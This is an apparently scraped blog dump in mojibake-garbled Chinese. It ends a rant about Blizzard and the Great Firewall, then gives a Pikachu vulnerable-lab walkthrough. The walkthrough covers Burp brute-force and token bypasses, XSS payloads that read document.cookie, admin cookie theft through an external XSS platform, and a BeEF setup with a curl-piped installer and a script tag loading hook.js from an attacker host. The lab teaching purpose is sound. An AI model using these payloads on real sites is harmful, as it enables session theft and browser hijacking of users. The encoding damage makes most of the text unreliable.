ç„¶åä¹Ÿåªæœ‰ä¸­å›½å’Œå…¶ä»–æå°‘éƒ¨åˆ†å›½å®¶æ— æ³•æ­£å¸¸è®¿é—®Google, ç°åœ¨å¥½åƒåªæœ‰ä¸­å›½æ²¡æ³•ç©æš´é›ªå§ğŸ˜‚, ç„¶åæœ‰äººå°±è·³å‡ºæ¥è¯´, æˆ‘ä»¬çš„é¦™æ¸¯å’Œå°æ¹¾ä¸æ˜¯å¯ä»¥è®¿é—®å—? ç°åœ¨ä½ å°±éœ€è¦æƒ³ä¸€æƒ³, æ¸¯å°å’Œä¸­å›½çš„å…³ç³»äº†\næœ‰äººæ‰¹åˆ¤æš´é›ªæŠŠæ¸¸æˆä¸Šå‡åˆ°äº†æ”¿æ²», tmdæ˜¯è°å…ˆæŠŠæ¸¸æˆä¸Šå‡åˆ°zzçš„? å¥½åƒä¸æ˜¯æš´é›ªå§, ä½ ä¸ªé˜²æŠ¤å¢™ä¸ºå•¥è¦å¢™æ¸¸æˆ, æˆ–è€…è¯´ä½ ä¸ºå•¥è¦æœ‰é˜²ç«å¢™? éš¾é“ä¸æ˜¯zzç›®çš„? é˜²ç«å¢™çš„å­˜åœ¨æœ¬æ¥å°±æ˜¯zzç›®çš„, è¿˜åœ¨è¿™è´¼å–Šæ‰è´¼, è¿™é‡Œä¹Ÿå¸Œæœ›å°ç²‰çº¢ä»¬æœ‰ç‚¹è„‘å­, å¤šæƒ³æƒ³æ ¹æœ¬, åˆ«tmè·Ÿç€è§‚å¯Ÿè€…ç½‘ç©äº†.\nè€Œä¸”, ä½ nbä½ ä¹Ÿè®©ä½ çš„ç½‘æ˜“ä¸Šå‡åˆ°æ”¿æ²»å•Š, çœ‹çœ‹æœ‰æ²¡æœ‰äººç†ä½ å°±å®Œäº†. è¿™é‡Œå¯ä»¥ä»¥å²ä¸ºé‰´, googleé€€å‡ºä¸­å›½, æ— ç–‘æ˜¯ä¸­å›½çš„æŸå¤±, ä½†æ˜¯ä½ tmç™¾åº¦é€€å‡ºç¾å›½, å¯¹ç¾å›½æœ‰ä¸ªæ¯›å½±å“, åƒä¸‡åˆ«ä»¥ä¸ºChinaçœŸçš„æœ‰ä½ æƒ³è±¡ä¸­é‚£ä¹ˆnb, ç›²ç›®è‡ªå¤§.\nä¸­å›½ç”µç«åœ¨å®¶é•¿å’Œgfwçš„åŒé‡å½±å“ä¸‹, å¾ˆéš¾æœ‰æœªæ¥äº†. å¯ä»¥å‘ç°ç°åœ¨æ¯”è¾ƒç«çš„æ¸¸æˆ, ç«æŠ€æ€§æ¯”è¾ƒå¼ºçš„, ç°åœ¨ç©çš„äººæ¯”è¾ƒå¤šçš„æ¸¸æˆæ— éå°±æ˜¯LOL/ç‹è€…è£è€€(æŠ„è¢­LOL)/å’Œå¹³ç²¾è‹±(æŠ„è¢­pubg)/CS, è¿˜æœ‰ä¸ªä»€ä¹ˆåŸç¥ä¸ä¹Ÿæ˜¯æŠ„è¢­å¡å°”è¾¾ä¼ è¯´ æ—·é‡ä¹‹æ¯å—?\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æ‰€è¯´æš´é›ªå‚²æ…¢çš„åŸå› , ä½ tmä¸­å›½æ²¡æœ‰ä»€ä¹ˆçœŸæ­£çš„å›½äº§åˆ›ä½œ, å…¨éƒ½ä¸­å›½æŠ„è¢­å•Š, äººæš´é›ªç‹‚æœ‰ç‹‚çš„é“ç†å•Š, è€Œä¸”äººå®¶æ˜¯ä¸–ç•Œå…¬å¸, ä½ ä¸­å›½äººå†å¤š, å¯¹äººå®¶å½±å“è¿˜èƒ½å¤šå¤§å•Š.\nåˆ«è€æ˜¯éª‚äººå®¶, äººå®¶ä¹Ÿæ‡’å¾—ç†ä½ , åˆ«è€æ˜¯å‘å‡ºä¸­å›½æœ€åçš„è­¦å‘Š, ä¸å¦‚è‡ªå·±å¼ºå¤§ä¸€äº›, è€åœ¨è¿™ç‹—å«å¹²å•¥å‘¢, çœŸæœ‰å‡ºæ¯, åˆ«tmæŠ„è¢­, è‡ªå·±åˆ›ä½œä¸€æ¬¾æ²¡æœ‰ä»»ä½•äº‰è®®çš„, å—å¤§å®¶å–œæ¬¢çš„çœŸæ­£çš„ä¸­å›½æ¸¸æˆ.\næˆ–è€…è¯´ä½ çœŸnbå»æ¨ç¿»gfw, æ¨ç¿»æŸå…š, æˆ–è€…æ‰“åˆ°ç¾åˆ©åš, æ¨ç‰¹éƒ½å‘ä¸äº†çš„äºº, åˆ«æ•´å¤©åœ¨å¾®åšé‡Œwoof.\n\næœªæ¥äººç»ˆç©¶è¿˜æ˜¯è¦å¾€å‰çœ‹çš„, ä¸èƒ½è€æ˜¯ç›¯ç€è¿‡å»ä¸æ”¾\nåœ¨æˆ‘åˆšçŸ¥é“ç½‘æ˜“å’Œæš´é›ªè§£çº¦çš„æ—¶å€™, æˆ‘å°±åœ¨æœŸå¾…è…¾è®¯èƒ½æ¥æ¥. ä½†æ˜¯ä¸€ç›´æ²¡æœ‰å¬åˆ°è¿™ä¸ªæ¶ˆæ¯, æœ€åè¿˜æ˜¯åœæœäº†, è€Œä¸”ä¸çŸ¥é“ä¸‹æ¬¡å¼€æœæ˜¯ä»€ä¹ˆæ—¶å€™\nå”¯ä¸€çš„å¥½æ¶ˆæ¯æ˜¯æœ‰ä¼ è¨€pddè¦å’Œæš´é›ªåˆä½œ, ä½†æ˜¯ä¹Ÿåªæ˜¯ä¼ è¨€è€Œå·², çœŸå®æ€§è¿˜æ˜¯æ²¡æ³•ä¿è¯\nä½†æ˜¯è¿™ä¸€åˆ‡éƒ½æ²¡æ³•ä»æ ¹æœ¬è§£å†³é—®é¢˜, æ€ä¹ˆé™¤æ ¹æˆ‘ä¸Šè¾¹å·²ç»æåˆ°è¿‡, æˆ‘ä¹Ÿä¸æƒ³åœ¨ç»“å°¾å¼ºè°ƒ, æ‰€ä»¥æˆ‘æŠŠå®ƒæ”¾åˆ°ä¸Šè¾¹äº†, å…å¾—æœ‰äººåªçœ‹ç»“å°¾, ä¸çœ‹å†…å®¹å°±ç»™æˆ‘æ‰£å±ç›†å­, æ¯•ç«ŸChineseæ˜¯å¾ˆâ€™æ³¨é‡ç»“å°¾â€™çš„\n","tags":["chat"]},{"title":"pikachué¶åœº","url":"/2022/08/28/pikachu%E9%9D%B6%E5%9C%BA/","content":"é¶åœºå®‰è£…æˆ‘è¿™é‡Œç›´æ¥æœ¬åœ°PHP_studyå®‰è£…äº†\n\nè¿™é‡Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯å»é…ç½®æ–‡ä»¶é‡Œæ”¹ä¸€ä¸‹æ•°æ®åº“ç›¸å…³é…ç½®\nç„¶åç‚¹å‡»å®‰è£…/åˆå§‹åŒ–\næš´åŠ›ç ´è§£\nBurte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰æ¦‚è¿°\nâ€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»å…·æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚ å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚\nç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚ æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚ è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š\n1.æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›2.æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›3.æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›4.æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›â€¦ç­‰ç­‰ã€‚åƒä¸‡ä¸è¦å°çœ‹æš´åŠ›ç ´è§£æ¼æ´,å¾€å¾€è¿™ç§ç®€å•ç²—æš´çš„æ”»å‡»æ–¹å¼å¸¦æ¥çš„æ•ˆæœæ˜¯è¶…å‡ºé¢„æœŸçš„!\nä½ å¯ä»¥é€šè¿‡â€œBurteForceâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\nä»æ¥æ²¡æœ‰å“ªä¸ªæ—¶ä»£çš„é»‘å®¢åƒä»Šå¤©ä¸€æ ·çƒ­è¡·äºçŒœè§£å¯†ç  â€”å¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸº\n\nåŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£æˆ‘ä»¬æŠ“åŒ…,å‘åˆ°intruder,è¿™é‡Œæˆ‘ä»¬é€‰æ‹©é›†æŸç‚¸å¼¹,åŠ è¿›å»ä¿©å­—å…¸,ç­›é€‰ä¸€ä¸‹é•¿åº¦,ç„¶åå°±å‘ç°ç™»é™†æˆåŠŸ\néªŒè¯ç ç»•è¿‡(on server)è¿™é‡Œæˆ‘ä»¬æŠ“åŒ…ä¼šå‘ç°,éªŒè¯ç æ˜¯cookieéªŒè¯,ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä¼ªé€ ,ç”šè‡³æ˜¯åŒä¸€ä¸ªéªŒè¯ç å¯ä»¥ä¸€ç›´ä½¿ç”¨,æˆ‘ä»¬å°±ä»ä¸€ä¸ªéªŒè¯ç å…¥æ‰‹çˆ†ç ´\néªŒè¯ç ç»•è¿‡(on client)å…ˆéšä¾¿å¡«ä¸€ä¸‹çœ‹çœ‹ï¼Œå‘ç°æ˜¯jså¼¹çª—é˜»æ­¢äº†ä½ å‰è¿›çš„è„šæ­¥ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ\næµè§ˆå™¨æœ‰jsï¼Œbpå¯æ²¡æœ‰å•Šï¼Œç›´æ¥çˆ†ç ´\ntokené˜²çˆ†ç ´?ç»è¿‡ä¸æ–­çš„é‡å‘åæˆ‘ä»¬ä¼šå‘ç°è¿™ä¸ªtokenæ˜¯æ¯è¯·æ±‚ä¸€æ¬¡å°±ä¼šéšä¹‹æ”¹å˜ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ–¹å¼æ•è·åˆ°å‘¢\nè¿™ä¸ªé¢˜æˆ‘ä»¬è¦çµæ´»ä½¿ç”¨bpè¿›è¡Œçˆ†ç ´\næˆ‘ä»¬å‘åˆ°intruderä¹‹åï¼Œæ”»å‡»æ–¹å¼é€‰æ‹©pitchforkï¼Œç„¶åè¦è¿›å…¥åˆ°é€‰é¡¹é‡Œ\n\ngrep - extract å‹¾é€‰ï¼Œalwayså‹¾é€‰\nç„¶åæ·»åŠ ï¼Œè¿™é‡Œæˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨æ­£åˆ™ï¼Œå› ä¸ºåªè¦é€‰ä¸­å°±ä¼šè‡ªåŠ¨ç”Ÿæˆ\n\nèµ„æºæ± é‡Œä¸€å®šè¦æœ‰ä¸€ä¸ªå•çº¿ç¨‹çš„\nç»™å¯†ç payloadé€‰å¥½å­—å…¸åï¼Œå°†tokençš„payloadæ”¹ä¸ºé€’å½’ï¼Œå¹¶ä¸”æ‰‹åŠ¨è¾“å…¥åˆšæ‰è¯·æ±‚åˆ°çš„ç¬¬ä¸€ä¸ªtoken\n\nXSS\nXSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰æ¦‚è¿°\nCross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™â€CSSâ€å†²çªï¼Œæ•…åˆç§°XSSã€‚ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š  1.åå°„æ€§XSS;  2.å­˜å‚¨å‹XSS;  3.DOMå‹XSS;\nXSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†: è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥; è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;\nä½ å¯ä»¥é€šè¿‡â€œCross-Site Scriptingâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\nåå°„å‹xss(get)\né•¿åº¦è¢«é™åˆ¶äº†ï¼Œçœ‹ä¸€ä¸‹æºç \nåŸæ¥20ï¼Œç›´æ¥åŠ ä¸ª0,ä¼¼ä¹æ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤,ç›´æ¥å¼¹å°±è¡Œ.\n\nåå°„å‹xss(post)è¿™é¢˜ç»™äº†æˆ‘ä»¬ä¸€ä¸ªç™»å½•è´¦å·å¯†ç admin\\123456,ç™»å½•è¿›å»ä»¥åæ˜¯ä¸€ä¸ªæ¡†,è¿™é‡Œå¥½åƒè¿˜æ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤,ä½†æ˜¯æˆ‘ä»¬ç”¨adminè´¦å·ç™»é™†äº†,å°±å¯ä»¥å°è¯•ä¸€ä¸‹xssæ‹¿adminçš„cookie,è¿™é‡Œä»‹ç»é™¤äº†å®˜æ–¹å¹³å°ç»™çš„å¦å¤–ä¸¤ç§æ–¹æ³•,ç¬¬ä¸€ç§å¾ˆç®€å•,ç”¨ä¸€ä¸‹å¤šå½©äº’è”ç½‘ä¸Šçš„xsså¹³å°,ä¸ç”¨è‡ªå·±æ­å»ºç”šè‡³æ˜¯ä¸ç”¨è‡ªå·±å†™ä¸€äº›jsè¯­å¥,å°±ä¼šè‡ªåŠ¨é’“ä¿¡æ¯ http://xsscom.com/ è¿™ä¸ªå¹³å¹³å°å¾ˆç®€å•,xssè¯­å¥éƒ½ç»™ä½ å†™å¥½äº†\n å¦ä¸€ç§å°±æ˜¯åœ¨è‡ªå·±çš„äº‘æœåŠ¡å™¨ä¸Šå†™ä¸€äº›phpä»£ç å°±å¯ä»¥è¯¦æƒ…å¯ä»¥å‚è€ƒè¿™ç¯‡https://charmersix.icu/2022/05/14/ctfshow_xss_wp/\nå­˜å‚¨å‹xsså­˜å‚¨å‹å’Œåå°„å‹çš„åŒºåˆ«è¿™é‡Œä¸å†èµ˜è¿°ï¼Œä½†æ˜¯payloadè¿˜æ˜¯ä¸€æ ·çš„\nDOMå‹xssæ‰“ä¸€ä¸‹æˆ‘ä»¬çš„ç»å…¸payloadæµ‹è¯•ä¸€çœ‹,è¿‡æ»¤å†™åˆ°å‰ç«¯äº†,å¤ªå¥½äº†,å°†æ³¨é‡Šé—­åˆä¸€ä¸‹å°±å¯ä»¥äº†.\nç»æµ‹è¯•â€™å¯ä»¥æ‰“æ–­æˆ‘ä»¬â€â€çš„é—­åˆ,æ‰€ä»¥payload&#39;1&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\nDOMå‹xss-x\nä¸Šä¸€é¢˜çš„payloadè¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œåªæ˜¯æˆ‘ä»¬è¦å†ç‚¹ä¸€ä¸‹å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§\nxssä¹‹ç›²æ‰“æ²¡æœ‰ä»»ä½•å›æ˜¾,æºç é‡Œä¹Ÿçœ‹ä¸è§ä»»ä½•ä¸œè¥¿,æˆ‘ä»¬dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹\næ‹¿åˆ°ä¸€ä¸ªç›®å½•,ä¼—æ‰€å‘¨çŸ¥pikachuçš„è´¦å·å¯†ç æ˜¯admin/123456å½“ç„¶ä½ ä¹Ÿå¯ä»¥è£…ä½œä¸çŸ¥é“,å†å»çˆ†ç ´ä¸€ä¸‹ç™»å½•åå°\nä¸€ç™»å½•åå°æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°è‡ªå·±åœ¨ç•™è¨€æ¿æ‰“çš„xsså·²ç»æ‰§è¡Œäº†,payloadè¿˜æ˜¯åŸæ¥çš„ç»å…¸,è¿™æ—¶å€™å°±å¯ä»¥é’“åˆ°adminçš„cookieäº†\nxssä¹‹è¿‡æ»¤æ‰“ä¸Šæˆ‘ä»¬é‚£ä¸²ç»å…¸çš„payload,å¾ˆæ˜æ˜¾æ²¡æœ‰æ‰§è¡Œ,é‚£å°±æ¢ä¸€å¥—è¿æ‹›\n\n&lt;img src=&#39;x&#39; onerror=&#39;alert(document.cookie)&#39;&gt;\n\næ‰§è¡ŒæˆåŠŸ\nxssä¹‹htmlspecialcharsäººç”Ÿä¹‹æ‰€æœ‰è‹¦çŸ­,æ˜¯å› ä¸ºä½ çš„xsså­¦ä¹ çš„è¿˜ä¸å¤Ÿå¥½\nè¿™é¢˜ä¹Ÿæ˜¯ç‚¹å‡»æ‰èƒ½å¼¹çª—çš„xss,onerrorå‡½æ•°å·²ç»ä¸èƒ½ç”¨äº†,è¿™æ—¶å¯ä»¥ç”¨onclick\nxssä¹‹hrefè¾“å‡ºè¿™é‡Œçœ‹äº†åˆ«äººçš„payload,ä½¿ç”¨äº†ä¸€ä¸ªJavaScriptåè®®payload:javascript:alert(1),ç„¶ååˆå‚è€ƒäº†è¿™ä½å¤§ä½¬çš„JavaScriptåè®®\nxssä¹‹jsè¾“å‡ºå…ˆæ¥ç»å…¸payloadçœ‹ä¸€ä¸‹\nçœ‹ä¸€ä¸‹æºç ä¼šå‘ç°è¾“å…¥çš„ä¸œè¥¿è¿›å…¥äº†&lt;script&gt;æ ‡ç­¾,é‚£æˆ‘ä»¬ç›´æ¥alertå°±å¥½äº†,å…ˆå°†â€™é—­åˆç„¶åæŠŠåè¾¹çš„æ³¨é‡Šä¸€ä¸‹&#39;;alert(document.cookie)//\nå‰ç½®èŠå£«JavaScriptåè®®ç®€ä»‹JavaScripté€šä¿¡åè®®æ˜¯ä¸€ä¸ªä¼ªåè®®,ç”¨äºæŒ‡å®šurlä¸ºJavaScriptä»£ç \n\nè¯­æ³•\njavascript:someScript\n\nsomeScriptæ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªä½¿ç”¨;åˆ†å‰²çš„JavaScriptè¯­å¥.\n\nå®ä¾‹\n&lt;a href=&quot;javasript:alert(document.cookie)&quot;&gt;JavaScript link&lt;/a&gt;\n\nç‰¹ç‚¹\nè¿”å›å€¼ä¼šæ›¿æ¢å½“å‰æ–‡æ¡£\nå¯¹äºchromeæµè§ˆå™¨æ¥è¯´,å¦‚æœæœ€åä¸€æ¡JavaScriptè¯­å¥çš„å€¼ä¸ºå­—ç¬¦ä¸²(ä½¿ç”¨â€™â€™,â€â€æˆ–`æ‹¬èµ·æ¥çš„å€¼),é‚£ä¹ˆè¯¥å­—ç¬¦ä¸²ä¼šæ›¿æ¢å½“å‰æ–‡æ¡£çš„å†…å®¹,ä½œä¸ºæ–°æ–‡æ¡£æ˜¾ç¤ºå‡ºæ¥\nå¯¹äºFirefoxæµè§ˆå™¨æ¥è¯´,å¦‚æœæœ€åä¸€æ¡æµè§ˆå™¨çš„è¿”å›å€¼ä¸æ˜¯undefined,é‚£ä¹ˆå°±è°ƒç”¨è¯¥è¿”å›å€¼çš„toString()æ–¹æ³•(å¦‚æœtoString()æ–¹æ³•ä¸å­˜åœ¨å°±è°ƒç”¨valueOf()æ–¹æ³•)å¾—åˆ°çš„ç»“æœä½œä¸ºæ–°æ–‡æ¡£æ˜¾ç¤ºå‡ºæ¥\nè¿”å›å€¼ä¸ºundefinedçš„å‡ ç§å¸¸è§å†™æ³•\njavascript:;javascript:undefined; //å…¨å±€å˜é‡undefinedçš„å€¼å¯èƒ½è¢«æ›´æ”¹//void å°†ä¹‹åçš„å†…å®¹å½“ä½œè¡¨è¾¾å¼ï¼Œç„¶åå¯¹è¯¥è¡¨è¾¾å¼æ±‚å€¼ï¼Œå¹¶å§‹ç»ˆè¿”å›undefinedï¼Œè€Œä¸ç®¡å…¨å±€å˜é‡ undefined çš„å€¼æ˜¯å¦è¢«æ”¹å˜// ä»¥ä¸‹å†™æ³•ç­‰ä»·javascript:void(0);javascript:void 0;\n\nç”¨é€”\nä»»ä½•ä½¿ç”¨urlçš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨è¯¥é€šä¿¡åè®®\nåœ¨ä¿ç•™é”šå…ƒç´ hrefå±æ€§çš„åŒæ—¶é˜²æ­¢ç‚¹å‡»é”šå…ƒç´ é¡µå†…/å¤–è·³è½¬\njavascript:;javascript:undefined;javascript:void(0);\n\nå½“ä½œ bookmarklet è¿™é‡Œå†™äº†ä¸ªå° Demo\n// ä¿®æ”¹ä¹¦ç­¾çš„ URL ä¸ºä»¥ä¸‹ä»£ç , å°±å¯å®ç°åˆ†å±åŠŸèƒ½javascript:&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#x27;+document.title+&#x27;&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;margin:0;&quot;&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;+location.href+&#x27;&gt;&lt;/iframe&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;+location.href+&#x27;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&#x27;;\n\næ‰§è¡Œ JavaScript ä»£ç  (å¯ä»¥æ‰§è¡Œxss)\n// æ›´æ”¹é¡µé¢èƒŒæ™¯ä¸ºç»¿è‰² (æ¨èä¸ºé”šå…ƒç´ ç»‘å®šäº‹ä»¶æ¥æ›´æ”¹é¡µé¢èƒŒæ™¯)&lt;a href=&quot;javascript:void(document.body.style.backgroundColor=&#x27;green&#x27;);&quot;&gt;// æ‰“å¼€æ–°é¡µé¢ (æ³¨æ„éœ€è¿”å› undefined, å¦åˆ™åœ¨ç«ç‹æµè§ˆå™¨ä¼šæ›¿æ¢æ–‡æ¡£)&lt;a href=&quot;javascript:window.open(&#x27;about:blank&#x27;); void(0);&quot;&gt;\n\nbeefå®‰è£…è¿™é‡Œæ¨èä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„xsså¹³å°ï¼šbeef, è¿™ä¸ªå¯ä»¥æ­åœ¨è‡ªå·±çš„vpsä¸Š,æˆ‘ä¹Ÿæ˜¯åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šèµ·äº†ä¸ªdocker,è¿™é‡Œç®€å•æ”¾ä¸€ä¸‹å®‰è£…æ­¥éª¤\né¦–å…ˆæ²¡æœ‰dockerçš„è¦å…ˆå®‰è£…\ncurl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun\n\nç„¶åæˆ‘ä»¬searchä¸€ä¸‹\ndocker search beef\n\n\nç„¶åæˆ‘ä»¬pullè¿™ä¸ªjanesçš„\ndocker pull docker.io/janes/beef\n\nç„¶åå°±å¯ä»¥runä¸€ä¸‹è·‘èµ·æ¥\ndocker run --rm -p 3000:3000 docker.io/janes/beef\n\n\nè¿™é‡Œæ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾çš„,ä½†æ˜¯å·²ç»è·‘èµ·æ¥äº†.ä¸ç”¨æ€€ç–‘,ç„¶åæˆ‘ä»¬è®¿é—®ä¸€ä¸‹http://your_ip:3000/ui/panelç™»å½•ä¸€ä¸‹,è´¦å·å¯†ç éƒ½æ˜¯beef\nç®€ä»‹beefå®˜æ–¹æ–‡æ¡£è¯´äº†ä¸€å †pè¯,æˆ‘æ˜¯æ²¡çœ‹æ‡‚,è¿™é‡ŒæŠ„ä¸€ä¸‹è¿™ä½å¤§ä½¬çš„\n\nbeefä¸»è¦æ˜¯å¾€ç½‘é¡µä¸­æ’å…¥ä¸€æ®µåä¸ºhook.jsçš„JavaScriptè„šæœ¬ä»£ç ,å¦‚æœæµè§ˆå™¨è®¿é—®æœ‰äº†hook.js(é’©å­)çš„é¡µé¢,å°±ä¼šè¢«hook(é’©ä½),å‹¾è¿çš„æµè§ˆå™¨ä¼šæ‰§è¡Œåˆå§‹ä»£ç è¿”å›ä¸€äº›ä¿¡æ¯,æ¥ç€ç›®æ ‡ä¸»æœºä¼šæ¯éš”ä¸€æ®µæ—¶é—´(é»˜è®¤ä¸º1s)å°±ä¼šå‘BeEFæœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¢é—®æ˜¯å¦æœ‰æ–°çš„ä»£ç éœ€è¦æ‰§è¡Œ\nbeefæœåŠ¡å™¨æœ¬è´¨ä¸Šå°±åƒä¸€ä¸ªwebåº”ç”¨,è¢«åˆ†ä¸ºå‰åç«¯.å‰ç«¯ä¼šè½®è¯¢åç«¯æ˜¯å¦æœ‰æ–°çš„æ•°æ®éœ€è¦æ›´æ–°,åŒæ—¶å‰ç«¯ä¹Ÿå¯ä»¥å‘åç«¯å‘é€æŒ‡ç¤º,beefæŒæœ‰è€…å¯ä»¥é€šè¿‡æµè§ˆå™¨æ¥ç™»å½•beefçš„åç«¯,æ¥æ§åˆ¶å‰ç«¯(ç”¨æˆ·çš„æµè§ˆå™¨)\nbeefä¸€èˆ¬å’Œxssæ¼æ´ç»“åˆä½¿ç”¨,ä½¿ç›®æ ‡ä¸»æœºæ‰§è¡Œå¸¦æœ‰jsçš„æ–‡ä»¶,ä½†åªèƒ½æ§åˆ¶ä¸€ä¸ªé¡µé¢\n\nä½¿ç”¨ç»å…¸payload&lt; script src=â€œhttp://your_ip/hook.jsâ€&gt;&lt; /script 